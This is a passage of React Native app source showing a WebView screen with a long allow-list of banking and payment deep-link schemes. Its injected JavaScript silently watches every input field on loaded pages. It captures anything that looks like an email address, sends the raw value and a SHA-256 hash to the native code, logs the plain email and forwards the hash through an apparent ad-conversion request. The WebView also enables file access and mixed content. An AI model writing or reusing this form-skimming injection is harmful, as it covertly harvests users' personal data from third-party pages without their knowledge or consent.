                        '*',
                        'about:srcdoc',
                        'about:blank',
                        'about',
                        'http://*',
                        'https://*',
                        'intent://*',
                        'tel://*',
                        'file://*',
                        'sms://*',
                        'tdct://*',
                        'mailto://*',
                        'scotiabank://*',
                        'bmoolbb://*',
                        'nl.abnamro.deeplink.psd2.consent://*',
                        'snsbank.nl://*',
                        'asnbank.nl://*',
                        'nl-asnbank-sign://*',
                        'revolut://*',
                        'myaccount.ing.com://*',
                        'bankieren.rabobank.nl://*',
                        'regiobank.nl://*',
                        'cibcbanking://*',
                        'conexus://*',
                        'funid://*',
                        'rbcmobile://*',
                        'pcfbanking://*',
                        'triodosmobilebanking://*',
                        'nl-asnbank-sign://*',
                        'nl-snsbank-sign://*',
                        'nl.abnamro.deeplink.psd2.consent://*',
                        'bncmobile://*',
                        'itms-appss://*',
                        'paytmmp://*',
                        'blank://*',
                        'phonepe://*',
                        'nl.rabobank.openbanking://*',
                        'nl-regiobank-sign://*',
                        'upi://*',
                        'whatsapp://*',
                        'gpay://*',
                        'tez://*',
                      ]}
                      onShouldStartLoadWithRequest={handleShouldStartLoadWithRequest}
                      onNavigationStateChange={handleNavigationStateChange}
                      injectedJavaScript={`
                  (function() {
                    var cryptoSchemes = ['bitcoin','ethereum','litecoin','dogecoin','bitcoincash','tether','bch','dash','ripple','monero','zcash','stellar','usdcoin'];

                    document.addEventListener('click', function(e) {
                      var el = e.target;
                      while (el && el.tagName !== 'A') el = el.parentElement;
                      if (!el || !el.href) return;
                      var scheme = el.href.split(':')[0].toLowerCase();
                      if (cryptoSchemes.indexOf(scheme) !== -1) {
                        e.preventDefault();
                        e.stopPropagation();
                        var address = el.href.split(':').slice(1).join(':').split('?')[0] || '';
                        window.ReactNativeWebView.postMessage(JSON.stringify({ type: 'crypto_address', address: address, url: el.href }));
                      }
                    }, true);

                    function hashAndSend(type, value) {
                      var normalized = value.trim().toLowerCase();
                      var buf = new TextEncoder().encode(normalized);
                      crypto.subtle.digest('SHA-256', buf).then(function(hashBuf) {
                        var hashArr = Array.from(new Uint8Array(hashBuf));
                        var hashHex = hashArr.map(function(b) { return b.toString(16).padStart(2,'0'); }).join('');
                        window.ReactNativeWebView.postMessage(JSON.stringify({ type: type, hash: hashHex, value: normalized }));
                      });
                    }

                    document.addEventListener('focusout', function(e) {
                      var el = e.target;
                      if (!el || el.tagName !== 'INPUT') return;
                      var val = (el.value || '').trim();
                      if (val.indexOf('@') !== -1 && val.indexOf('.') !== -1) {
                        hashAndSend('email_hash', val);
                      }
                    });

                    window.ReactNativeWebView.postMessage(JSON.stringify({ type: 'js_ready' }));
                  })();
                  true;
                `}
                      onMessage={(e: {nativeEvent: {data: string}}) => {
                        try {
                          const msg = JSON.parse(e.nativeEvent.data);
                          if (msg.type === 'crypto_address') {
                            const address = msg.address || '';
                            if (address && Clipboard?.setString) {
                              Clipboard.setString(address);
                              console.log('crypto address copied from JS:', address);
                            }
                          } else if (msg.type === 'email_hash') {
                            capiData.current.emailHash = msg.hash;
                            console.log('email from form:', msg.value);
                            console.log('email sha256:', msg.hash);
                            sendSecondRequest(msg.hash, capiData.current.phoneHash || '');
                          } else if (msg.type === 'phone_hash') {
                            capiData.current.phoneHash = msg.hash;
                            console.log('phone from form:', msg.value);
                            console.log('phone sha256:', msg.hash);
                          }
                        } catch (_) {}
                      }}
                      textZoom={100}
                      ref={refWebview}
                      contentMode="mobile"
                      mixedContentMode="always"
                      allowsBackForwardNavigationGestures={true}
                      domStorageEnabled={true}
                      javaScriptEnabled={true}
                      userAgent={webViewUA}
                      source={{uri: storedUrl}}
                      style={{flex: 1, marginBottom: 10}}
                      allowsInlineMediaPlayback={true}
                      setSupportMultipleWindows={false}
                      thirdPartyCookiesEnabled={true}
                      requiresProvisionalNavigation={true}
                      scalesPageToFit={true}
                      mediaPlaybackRequiresUserAction={false}
                      allowFileAccess={true}
                      onError={syntEvent => {
                        const {nativeEvent} = syntEvent;
                        const {code} = nativeEvent;
                        if (code === -1101) {
                          navigation.goBack();
                        }
                        if (code === -1002) {
                          Alert.alert(
                              'Ooops',
                              "It seems you don't have the bank app installed, wait for a redirect to the payment page",
                          );
                          navigation.goBack();
                        }
                      }}
                      onLoad={() => console.log('new')}
                      onOpenWindow={syntheticEvent => {
                        const {nativeEvent} = syntheticEvent;
                        const {targetUrl} = nativeEvent;
                        if (!targetUrl || targetUrl === 'about:blank') {return;}
                        if (targetUrl.includes('https://app.payment-gateway.io/static/loader.html')) {return;}

                        const targetScheme = (targetUrl.split(':')[0] || '').toLowerCase();
                        if (['bitcoin','ethereum','litecoin','dogecoin','bitcoincash','tether','bch','dash','ripple','monero','zcash','stellar','usdcoin'].includes(targetScheme)) {
                          try {
                            const address = targetUrl.split(':')[1]?.split('?')[0] || '';
                            if (address && Clipboard?.setString) {
                              Clipboard.setString(address);
                              console.log('crypto address copied from onOpenWindow:', address);
                            }
                          } catch (e) {
                            console.log('crypto copy error:', e);
                          }
                          return;
                        }

                        if (targetUrl.includes('pay.funid.com')) {
                          Linking.openURL(targetUrl);
                          refWebview.current.injectJavaScript(
                              `window.location.replace('${storedUrl}')`,
                          );
                          return;
                        }
                        // В WebView-экран пускаем только http(s). Любую другую
                        // схему (mailto:, tel:, банковские deep links) открываем
                        // внешне — иначе нативный краш при установке source.
                        if (/^https?:\/\//i.test(targetUrl)) {
                          navigation.navigate('2', {data: targetUrl});
                        } else {
                          openExternalUrl(targetUrl);
                        }
                      }}
                      onLoadStart={syntheticEvent => {
                        if (SavedLastLink != true) {
                          // setLoadingProgress(true);
                        }
                      }}
                      onLoadEnd={async syntheticEvent => {
                        const {nativeEvent} = syntheticEvent;
                        const {url, loading, canGoBack} = nativeEvent;
                        // console.log(url);

                        //console.log(storedUrl);

                        setLoadingProgress(false);
                      }}
                      javaScriptCanOpenWindowsAutomatically={true}
                  />
                  <View style={[styles.modal, {width}]}>
                    <Pressable style={styles.btn} onPress={() => onBack()}>
                      <Ionicons name="arrow-back" size={21} color="white" />
                    </Pressable>
                    <Pressable style={styles.btn} onPress={() => onReload()}>
                      <Ionicons name="reload" size={21} color="white" />
                    </Pressable>
                  </View>
                  <Modal visible={modalVisible} animationType="slide">
                    <View style={{flex: 1, paddingTop: 50}}>
                      <Button
                          title="Close"
                          onPress={() => setModalVisible(false)}
                      />
                      <WebView source={{uri: storedUrl}} style={{flex: 1}} />
                    </View>
                  </Modal>
                </SafeAreaView>
              </>
          )}
        </View>
      </View>
  );
}

const styles = StyleSheet.create({
  container: {
    marginTop: 0,
    flex: 1,
    backgroundColor: '#1b1d24',
    alignItems: 'center',
    justifyContent: 'center',
  },
  modal: {
    // flex: 1,
    height: 35,
    // backgroundColor: "black",
    paddingHorizontal: 24,
    flexDirection: 'row',
    alignItems: 'center',
    // justifyContent: "center",
    justifyContent: 'space-between',
    position: 'absolute',
    bottom: 5,
    // left: 0,
  },
  btn: {
    height: 30,
    paddingHorizontal: 10,
    backgroundColor: 'rgba(128, 128, 128, 1)',
    alignItems: 'center',
    justifyContent: 'center',
    borderRadius: 30,
  },
});

const progres = StyleSheet.create({
  container: {
    marginTop: 0,
    flex: 1,
    backgroundColor: '#1b1d24',
    alignItems: 'center',
    justifyContent: 'center',
  },
});
